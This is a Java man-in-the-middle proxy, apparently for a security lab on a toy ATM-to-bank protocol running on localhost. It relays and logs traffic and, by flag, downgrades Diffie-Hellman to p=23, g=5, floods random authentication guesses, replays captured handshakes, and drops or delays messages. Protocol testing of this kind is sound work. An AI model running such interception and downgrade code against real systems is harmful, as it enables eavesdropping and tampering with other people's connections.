import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.*;

public class MitmProxy {
    // Configuration
    private static int listenPort = 4000;
    private static String serverIP = "127.0.0.1";
    private static int serverPort = 3000;
    
    // Attack flags
    private static boolean enableConfidentiality = false;
    private static boolean enableIntegrity = false;
    private static boolean enableCorrectness = false;
    private static boolean enableReplay = false;
    private static boolean enableWeakDH = false;
    private static boolean enableBruteForce = false;
    
    // State tracking
    private static AtomicInteger messageCounter = new AtomicInteger(0);
    private static List<String> capturedHandshake = Collections.synchronizedList(new ArrayList<>());
    private static Random rand = new Random();

    public static void main(String[] args) throws IOException {
        parseArgs(args);
        
        System.out.println("[MITM] Starting with attacks:");
        System.out.println("  Confidentiality: " + enableConfidentiality);
        System.out.println("  Integrity:      " + enableIntegrity);
        System.out.println("  Correctness:    " + enableCorrectness);
        System.out.println("  Replay:         " + enableReplay);
        System.out.println("  Weak DH:        " + enableWeakDH);
        System.out.println("  Brute Force:    " + enableBruteForce);

        ServerSocket serverSocket = new ServerSocket(listenPort);
        System.out.println("[MITM] Listening on port " + listenPort + " (fake bank)");

        while (true) {
            Socket clientSocket = serverSocket.accept();
            System.out.println("\n[MITM] ATM connected: " + clientSocket.getInetAddress());
            
            Socket bankSocket = new Socket(serverIP, serverPort);
            System.out.println("[MITM] Connected to real bank at " + serverIP + ":" + serverPort);

            // Handshake interception
            new Thread(() -> handleHandshake(clientSocket, bankSocket)).start();
        }
    }

    private static void handleHandshake(Socket client, Socket bank) {
        try (
            BufferedReader fromATM = new BufferedReader(new InputStreamReader(client.getInputStream()));
            PrintWriter toATM = new PrintWriter(client.getOutputStream(), true);
            BufferedReader fromBank = new BufferedReader(new InputStreamReader(bank.getInputStream()));
            PrintWriter toBank = new PrintWriter(bank.getOutputStream(), true)
        ) {
            // Phase 1: DH Parameter Exchange
            String dhParams = fromATM.readLine();
            System.out.println("[HANDSHAKE] Original DH Params: " + dhParams);
            
            if (enableWeakDH) {
                dhParams = "DH:p=23,g=5"; // Extremely weak parameters
                System.out.println("[WEAK DH] Forced weak parameters: " + dhParams);
            }
            toBank.println(dhParams);
            capturedHandshake.add(dhParams);

            // Phase 2: Authentication
            String authMsg = fromATM.readLine();
            System.out.println("[HANDSHAKE] Auth Message: " + authMsg);
            
            if (enableBruteForce) {
                System.out.println("[BRUTE FORCE] Starting 100 attempts...");
                for (int i = 0; i < 100; i++) {
                    String guess = String.format("%016x", rand.nextLong()) + 
                                  String.format("%016x", rand.nextLong());
                    toBank.println("AUTH:" + guess);
                }
            }
            toBank.println(authMsg);
            capturedHandshake.add(authMsg);

            // Phase 3: Session Establishment
            String sessionMsg = fromATM.readLine();
            toBank.println(sessionMsg);
            capturedHandshake.add(sessionMsg);

            System.out.println("[MITM] Handshake complete, starting encrypted relay");

            // Start encrypted message relay with attacks
            ExecutorService executor = Executors.newFixedThreadPool(2);
            executor.submit(() -> relayMessages(fromATM, toBank, client, bank, true));
            executor.submit(() -> relayMessages(fromBank, toATM, bank, client, false));
            
        } catch (IOException e) {
            System.out.println("[MITM] Handshake error: " + e.getMessage());
        }
    }

    private static void relayMessages(BufferedReader in, PrintWriter out, 
                                    Socket inSocket, Socket outSocket, 
                                    boolean fromATM) {
        try {
            String line;
            while ((line = in.readLine()) != null) {
                int msgNum = messageCounter.incrementAndGet();
                System.out.printf("[%s->%s] Msg %d: %s%n",
                    fromATM ? "ATM" : "BANK",
                    fromATM ? "BANK" : "ATM",
                    msgNum,
                    line);

                // CONFIDENTIALITY: Just log message existence
                if (enableConfidentiality) {
                    System.out.printf("[CONFIDENTIALITY] Encrypted message %d (%d bytes)%n",
                        msgNum, line.length());
                }

                // REPLAY: Capture and resend handshake messages
                if (enableReplay && msgNum == 5) { // After 5 messages
                    System.out.println("[REPLAY] Injecting captured handshake");
                    for (String handshakeMsg : capturedHandshake) {
                        out.println(handshakeMsg);
                    }
                }

                // CORRECTNESS: Message manipulation
                if (enableCorrectness) {
                    if (rand.nextDouble() < 0.1) { // 10% drop rate
                        System.out.println("[CORRECTNESS] Dropping message " + msgNum);
                        continue;
                    }
                    if (rand.nextDouble() < 0.1) { // 10% delay
                        System.out.println("[CORRECTNESS] Delaying message " + msgNum);
                        Thread.sleep(rand.nextInt(1000));
                    }
                }

                // Forward the (possibly modified) message
                out.println(line);
            }
        } catch (Exception e) {
            System.out.println("[MITM] Relay error: " + e.getMessage());
        } finally {
            try {
                inSocket.close();
                outSocket.close();
            } catch (IOException ignored) {}
        }
    }

    private static void parseArgs(String[] args) {
        for (int i = 0; i < args.length; i++) {
            switch (args[i]) {
                case "--confidentiality":
                    enableConfidentiality = true;
                    break;
                case "--integrity":
                    enableIntegrity = true;
                    System.out.println("[WARNING] Integrity attacks require protocol break");
                    break;
                case "--correctness":
                    enableCorrectness = true;
                    break;
                case "--replay":
                    enableReplay = true;
                    break;
                case "--weakdh":
                    enableWeakDH = true;
                    break;
                case "--bruteforce":
                    enableBruteForce = true;
                    break;
            }
        }
    }
}